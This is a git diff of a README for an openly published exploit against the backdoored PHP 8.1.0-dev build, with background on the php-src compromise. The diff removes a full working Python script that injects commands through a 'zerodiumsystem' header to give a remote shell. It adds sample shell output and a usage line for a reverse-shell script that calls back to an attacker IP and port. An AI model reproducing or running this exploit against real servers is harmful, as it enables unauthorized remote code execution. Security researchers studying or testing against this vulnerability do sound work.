@@ -14,11 +14,12 @@ The original code was restored after the issue was discovered, but then tampered
 ## Summary
 
 1- The Story   
-2- POC Script    
+2- POC Script
+3- Reverse Shell
   
 
 * * * 
-## 1- The story
+## 1- The Story
 
 ### 1.1- PHP source code targeted in backdoor attack ?
 
@@ -46,58 +47,61 @@ Additionally, the master.php.net authentication system is said to be on a very o
 
 As a consequence, the maintainers have migrated master.php.net to a new main.php.net system with support for TLS 1.2, in addition to resetting all existing passwords and storing passwords using bcrypt instead of a plain MD5 hash.
 
-* * * 
-
 ## 2- POC Script
 
-This short exploit script uses the backdoor to provide a pseudo system shell on the host.
+This short exploit script [backdoor_php_8.1.0-dev.py](https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/backdoor_php_8.1.0-dev.py) uses the backdoor to provide a pseudo system shell on the host.
+
+It has the number [49933](https://www.exploit-db.com/exploits/49933) on [Exploit DB](https://www.exploit-db.com/exploits/49933).   
 
 - **Exploit Title:** PHP 8.1.0-dev Backdoor Remote Code Execution    
 - **Date:** 23 may 2021   
 - **Exploit Author:** flast101   
 - **Vendor Homepage:** [https://www.php.net/](https://www.php.net/)    
-- **Software Link:** [https://github.com/vulhub/vulhub/tree/master/php/8.1-backdoor](https://github.com/vulhub/vulhub/tree/master/php/8.1-backdoor)           
+- **Software Link:** [https://github.com/vulhub/vulhub/tree/master/php/8.1-backdoor](https://github.com/vulhub/vulhub/tree/master/php/8.1-backdoor)            
 - **Tested on version:** 8.1.0-dev    
 - **CVE** : N/A    
-- Previous vulnerability references:    
+- **Vulnerability references**:    
 [https://github.com/php/php-src/commit/2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a](https://github.com/php/php-src/commit/2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a)    
 [https://github.com/vulhub/vulhub/blob/master/php/8.1-backdoor/README.zh-cn.md](https://github.com/vulhub/vulhub/blob/master/php/8.1-backdoor/README.zh-cn.md)    
 
 
 
-```python
-#!/usr/bin/env python3
-import os
-import re
-import requests
+Usage:
 
-host = input("Enter the full host url:\n")
-request = requests.Session()
-response = request.get(host)
 
-if str(response) == '<Response [200]>':
-    print("\nInteractive shell is opened on", host, "\nCan't access tty; job crontol turned off.")
-    try:
-        while 1:
-            cmd = input("$ ")
-            headers = {
-            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
-            "User-Agentt": "zerodiumsystem('" + cmd + "');"
-            }
-            response = request.get(host, headers = headers, allow_redirects = False)
-            current_page = response.text
-            stdout = current_page.split('<!DOCTYPE html>',1)
-            text = print(stdout[0])
-    except KeyboardInterrupt:
-        print("Exiting...")
-        exit
-
-else:
-    print("\r")
-    print(response)
-    print("Host is not available, aborting...")
-    exit
 ```
+┌──(user㉿kali)-[~/Documents]
+└─$ python3 backdoor_php_8.1.0-dev.py
+  
+Enter the host url:
+http://a.b.c.d
+
+Interactive shell is opened on http://http://a.b.c.d 
+Can't acces tty; job crontol turned off.
+$ id
+uid=1000(user) gid=1000(user) groups=1000(user)
+```
+
+* * * 
+
+## 3- Reverse Shell    
+
+This short exploit script [revshell_php_8.1.0-dev.py](https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/revshell_php_8.1.0-dev.py) gives a reverse shell on target.
+
+
+Usage:
+
+
+```
+┌──(user㉿kali)-[~/Documents]
+└─$ python3 revshell_php_8.1.0-dev.py <target URL> <attacker IP> <attacker PORT>
+```
+
+![docs/revshell-script.png](docs/revshell-script.png "docs/revshell-script.png")
+
+
+
+
 
 Be Curious, Learning is Life !
 
